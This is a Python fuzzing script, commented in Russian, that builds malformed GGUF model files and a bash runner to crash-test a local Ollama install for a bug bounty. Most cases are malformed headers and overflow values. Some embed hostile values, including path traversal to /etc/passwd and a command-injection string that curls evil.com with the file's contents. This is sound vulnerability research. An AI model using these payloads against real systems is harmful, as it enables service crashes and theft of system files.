#!/usr/bin/env python3
"""
GGUF Fuzzer для Ollama — Поиск уязвимостей в парсере модельных файлов
Bounty: до $4,000 на huntr.com

Описание: Создаёт серию malformed GGUF-файлов и тестирует их через Ollama API.
Цель: найти crash, segfault, memory leak, buffer overflow.

Использование:
    1. Убедись, что Ollama запущена: ollama serve
    2. Запусти: python3 01_gguf_fuzzer.py
    3. Проверяй логи Ollama на предмет crash/panic
"""

import struct
import os
import sys
import json
import time
import subprocess
import hashlib

# === GGUF Формат ===
# Спецификация: https://github.com/ggerganov/ggml/blob/master/docs/gguf.md
#
# Структура GGUF файла:
# 1. Magic: 4 bytes "GGUF"
# 2. Version: uint32 (текущая = 3)
# 3. Tensor count: uint64
# 4. Metadata KV count: uint64
# 5. Metadata key-value pairs
# 6. Tensor info
# 7. Padding to alignment
# 8. Tensor data

GGUF_MAGIC = b'GGUF'
GGUF_VERSION_1 = 1
GGUF_VERSION_2 = 2
GGUF_VERSION_3 = 3

OUTPUT_DIR = "fuzz_gguf_output"


def create_output_dir():
    """Создаёт директорию для malformed файлов"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    print(f"[*] Директория для тестовых файлов: {OUTPUT_DIR}/")


def save_test(name, data, description):
    """Сохраняет тестовый файл и описание"""
    filepath = os.path.join(OUTPUT_DIR, f"{name}.gguf")
    with open(filepath, 'wb') as f:
        f.write(data)
    
    desc_path = os.path.join(OUTPUT_DIR, f"{name}.txt")
    with open(desc_path, 'w') as f:
        f.write(f"Тест: {name}\n")
        f.write(f"Описание: {description}\n")
        f.write(f"Размер файла: {len(data)} bytes\n")
        f.write(f"SHA256: {hashlib.sha256(data).hexdigest()}\n")
        f.write(f"Hex dump (первые 64 байта): {data[:64].hex()}\n")
    
    print(f"  [+] {name}: {description} ({len(data)} bytes)")
    return filepath


def generate_tests():
    """Генерирует серию malformed GGUF файлов"""
    tests = []
    
    print("\n[*] === КАТЕГОРИЯ 1: Минимальные/пустые файлы ===")
    
    # Тест 1: Только magic header (4 байта)
    # Уже находили crash — проверяем, исправлено ли
    tests.append(save_test(
        "t01_magic_only",
        GGUF_MAGIC,
        "Только GGUF magic header, 4 байта. Ранее вызывал segfault."
    ))
    
    # Тест 2: Пустой файл
    tests.append(save_test(
        "t02_empty_file",
        b'',
        "Полностью пустой файл. Проверка обработки нулевого размера."
    ))
    
    # Тест 3: Один байт
    tests.append(save_test(
        "t03_one_byte",
        b'\x00',
        "Файл из одного нулевого байта."
    ))
    
    # Тест 4: Magic + обрезанный version
    tests.append(save_test(
        "t04_truncated_version",
        GGUF_MAGIC + b'\x03\x00',  # только 2 байта из 4
        "Magic + неполный version (2 байта вместо 4)."
    ))
    
    print("\n[*] === КАТЕГОРИЯ 2: Невалидные значения заголовка ===")
    
    # Тест 5: Version = 0 (невалидная)
    tests.append(save_test(
        "t05_version_zero",
        GGUF_MAGIC + struct.pack('<I', 0) + struct.pack('<Q', 0) + struct.pack('<Q', 0),
        "Version = 0 (невалидная версия)."
    ))
    
    # Тест 6: Version = MAX_UINT32
    tests.append(save_test(
        "t06_version_max",
        GGUF_MAGIC + struct.pack('<I', 0xFFFFFFFF) + struct.pack('<Q', 0) + struct.pack('<Q', 0),
        "Version = 0xFFFFFFFF (максимальное uint32)."
    ))
    
    # Тест 7: Огромное количество тензоров
    tests.append(save_test(
        "t07_huge_tensor_count",
        GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0xFFFFFFFFFFFFFFFF) + struct.pack('<Q', 0),
        "Tensor count = MAX_UINT64. Может вызвать integer overflow при выделении памяти."
    ))
    
    # Тест 8: Огромное количество metadata KV
    tests.append(save_test(
        "t08_huge_kv_count",
        GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 0xFFFFFFFFFFFFFFFF),
        "Metadata KV count = MAX_UINT64. Может вызвать OOM или integer overflow."
    ))
    
    # Тест 9: Оба максимальные
    tests.append(save_test(
        "t09_both_max",
        GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0xFFFFFFFFFFFFFFFF) + struct.pack('<Q', 0xFFFFFFFFFFFFFFFF),
        "И tensor count, и KV count = MAX_UINT64."
    ))
    
    print("\n[*] === КАТЕГОРИЯ 3: Поддельные/кривые magic bytes ===")
    
    # Тест 10: Почти правильный magic
    tests.append(save_test(
        "t10_wrong_magic_close",
        b'GGUL' + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 0),
        "Magic = 'GGUL' вместо 'GGUF'. Проверка валидации magic."
    ))
    
    # Тест 11: GGUF в reverse
    tests.append(save_test(
        "t11_reverse_magic",
        b'FUGG' + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 0),
        "Magic = 'FUGG' (reverse). Big-endian vs little-endian confusion?"
    ))
    
    # Тест 12: Null magic
    tests.append(save_test(
        "t12_null_magic",
        b'\x00\x00\x00\x00' + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 0),
        "Magic = 4 нулевых байта."
    ))
    
    print("\n[*] === КАТЕГОРИЯ 4: Metadata injection ===")
    
    # Тест 13: Metadata с невалидным типом
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 1)
    # KV pair: key length + key + value type + value
    key = b'general.architecture'
    kv_data = struct.pack('<Q', len(key)) + key + struct.pack('<I', 0xFF)  # невалидный тип
    tests.append(save_test(
        "t13_invalid_kv_type",
        header + kv_data,
        "Metadata KV с невалидным типом значения (0xFF)."
    ))
    
    # Тест 14: Очень длинный ключ metadata
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 1)
    long_key = b'A' * 100000
    kv_data = struct.pack('<Q', len(long_key)) + long_key + struct.pack('<I', 8)  # type STRING
    tests.append(save_test(
        "t14_long_key",
        header + kv_data,
        "Metadata с ключом 100KB. Проверка на buffer overflow в строковых операциях."
    ))
    
    # Тест 15: Key length указывает за пределы файла
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 1)
    kv_data = struct.pack('<Q', 0xFFFFFFFF) + b'short'  # length says huge, data is short
    tests.append(save_test(
        "t15_key_length_overflow",
        header + kv_data,
        "Key length = 0xFFFFFFFF, но реальных данных 5 байт. Out-of-bounds read?"
    ))
    
    print("\n[*] === КАТЕГОРИЯ 5: Специальные символы в metadata ===")
    
    # Тест 16: Path traversal в имени модели
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 1)
    key = b'general.name'
    value = b'../../../etc/passwd'
    kv_data = (struct.pack('<Q', len(key)) + key + 
               struct.pack('<I', 8) +  # type STRING
               struct.pack('<Q', len(value)) + value)
    tests.append(save_test(
        "t16_path_traversal_name",
        header + kv_data,
        "general.name = '../../../etc/passwd'. Path traversal через metadata."
    ))
    
    # Тест 17: Null bytes в metadata
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 1)
    key = b'general.name'
    value = b'model\x00../../etc/passwd'
    kv_data = (struct.pack('<Q', len(key)) + key + 
               struct.pack('<I', 8) +  # type STRING
               struct.pack('<Q', len(value)) + value)
    tests.append(save_test(
        "t17_null_byte_injection",
        header + kv_data,
        "Null byte injection в имени модели. Может обойти фильтрацию путей."
    ))
    
    # Тест 18: Command injection в metadata
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 0) + struct.pack('<Q', 1)
    key = b'general.name'
    value = b'$(curl http://evil.com/steal?data=$(cat /etc/passwd))'
    kv_data = (struct.pack('<Q', len(key)) + key + 
               struct.pack('<I', 8) +
               struct.pack('<Q', len(value)) + value)
    tests.append(save_test(
        "t18_command_injection",
        header + kv_data,
        "Command injection через metadata. Если значение используется в shell."
    ))
    
    print("\n[*] === КАТЕГОРИЯ 6: Integer overflow в tensor info ===")
    
    # Тест 19: Tensor info с огромным offset
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 1) + struct.pack('<Q', 0)
    # Tensor info: name_len + name + n_dims + dims + type + offset
    tensor_name = b'test_tensor'
    tensor_info = (
        struct.pack('<Q', len(tensor_name)) + tensor_name +
        struct.pack('<I', 2) +  # n_dimensions = 2
        struct.pack('<Q', 1024) +  # dim[0]
        struct.pack('<Q', 1024) +  # dim[1]
        struct.pack('<I', 0) +  # type = GGML_TYPE_F32
        struct.pack('<Q', 0xFFFFFFFFFFFFFFFF)  # offset = MAX
    )
    tests.append(save_test(
        "t19_tensor_huge_offset",
        header + tensor_info,
        "Tensor с offset = MAX_UINT64. Может привести к out-of-bounds access."
    ))
    
    # Тест 20: Tensor с отрицательными dimensions (через overflow)
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 1) + struct.pack('<Q', 0)
    tensor_name = b'overflow_tensor'
    tensor_info = (
        struct.pack('<Q', len(tensor_name)) + tensor_name +
        struct.pack('<I', 4) +  # n_dimensions = 4
        struct.pack('<Q', 0x8000000000000000) +  # dim[0] - negative if signed
        struct.pack('<Q', 0x8000000000000000) +  # dim[1]
        struct.pack('<Q', 0x8000000000000000) +  # dim[2]
        struct.pack('<Q', 0x8000000000000000) +  # dim[3]
        struct.pack('<I', 0) +  # type
        struct.pack('<Q', 0)   # offset
    )
    tests.append(save_test(
        "t20_negative_dims",
        header + tensor_info,
        "Dimensions = 0x8000000000000000 (отрицательные если signed). Integer overflow?"
    ))
    
    print("\n[*] === КАТЕГОРИЯ 7: Рандомный мусор большого размера ===")
    
    # Тест 21: Валидный заголовок + рандомный мусор
    header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 100) + struct.pack('<Q', 100)
    garbage = os.urandom(4096)
    tests.append(save_test(
        "t21_valid_header_garbage",
        header + garbage,
        "Валидный заголовок (100 тензоров, 100 KV) + 4KB рандомных данных."
    ))
    
    # Тест 22: Всё нули, большой файл
    tests.append(save_test(
        "t22_all_zeros_large",
        GGUF_MAGIC + b'\x00' * 65536,
        "Magic + 64KB нулей. Проверка обработки нулевых значений."
    ))
    
    return tests


def create_modelfile(gguf_path):
    """Создаёт Modelfile для загрузки тестового GGUF через Ollama"""
    abs_path = os.path.abspath(gguf_path)
    modelfile_content = f'FROM {abs_path}\n'
    modelfile_path = gguf_path.replace('.gguf', '.Modelfile')
    with open(modelfile_path, 'w') as f:
        f.write(modelfile_content)
    return modelfile_path


def generate_all():
    """Основная функция — генерация всех тестов"""
    print("=" * 60)
    print("  GGUF Fuzzer для Ollama")
    print("  Bounty: $4,000 (Model File Vulnerabilities)")
    print("  Цель: crash, segfault, OOM, buffer overflow")
    print("=" * 60)
    
    create_output_dir()
    tests = generate_tests()
    
    # Создаём Modelfile для каждого теста
    print(f"\n[*] Создаю Modelfiles для загрузки через Ollama...")
    for test_path in tests:
        create_modelfile(test_path)
    
    # Создаём скрипт для автоматического прогона
    runner_script = os.path.join(OUTPUT_DIR, "run_all_tests.sh")
    with open(runner_script, 'w') as f:
        f.write("#!/bin/bash\n")
        f.write("# Автоматический прогон всех GGUF-тестов через Ollama\n")
        f.write("# Запусти: bash run_all_tests.sh\n")
        f.write("# Следи за логами Ollama в другом терминале!\n\n")
        f.write('echo "=== GGUF Fuzz Testing ===" \n')
        f.write('echo "Убедись что Ollama запущена: ollama serve"\n')
        f.write('echo "Следи за логами в другом терминале!"\n')
        f.write('echo ""\n\n')
        
        for i, test_path in enumerate(tests):
            basename = os.path.basename(test_path).replace('.gguf', '')
            model_name = f"fuzz-{basename}"
            modelfile = test_path.replace('.gguf', '.Modelfile')
            
            f.write(f'echo "[TEST {i+1}/{len(tests)}] {basename}"\n')
            f.write(f'echo "  Создаю модель {model_name}..."\n')
            f.write(f'timeout 10 ollama create {model_name} -f {os.path.abspath(modelfile)} 2>&1 | head -5\n')
            f.write(f'EXIT_CODE=$?\n')
            f.write(f'if [ $EXIT_CODE -eq 124 ]; then\n')
            f.write(f'    echo "  [!] TIMEOUT — возможно hang"\n')
            f.write(f'elif [ $EXIT_CODE -ne 0 ]; then\n')
            f.write(f'    echo "  [!] ОШИБКА (exit code: $EXIT_CODE) — ИССЛЕДОВАТЬ!"\n')
            f.write(f'else\n')
            f.write(f'    echo "  [OK] Обработано без crash"\n')
            f.write(f'fi\n')
            f.write(f'# Чистим\n')
            f.write(f'ollama rm {model_name} 2>/dev/null\n')
            f.write(f'echo ""\n')
            f.write(f'sleep 1\n\n')
    
    os.chmod(runner_script, 0o755)
    
    print(f"\n[*] === ИТОГО ===")
    print(f"  Создано тестовых файлов: {len(tests)}")
    print(f"  Директория: {OUTPUT_DIR}/")
    print(f"  Скрипт запуска: {runner_script}")
    print(f"\n[*] === КАК ЗАПУСТИТЬ ===")
    print(f"  1. Открой терминал 1: ollama serve")
    print(f"  2. Открой терминал 2: bash {runner_script}")
    print(f"  3. Следи за crash/panic в терминале 1")
    print(f"  4. Если Ollama упала — ты нашёл уязвимость! 🎯")
    print(f"\n[*] === ЧТО ИСКАТЬ ===")
    print(f"  - 'segmentation fault' — buffer overflow ($4,000)")
    print(f"  - 'panic: runtime error' — crash ($1,500-$4,000)")
    print(f"  - 'out of memory' — OOM через маленький файл ($1,500)")
    print(f"  - Ollama зависла (timeout) — DoS ($1,500)")
    print(f"  - Любое неожиданное поведение — исследуй!")


if __name__ == "__main__":
    generate_all()
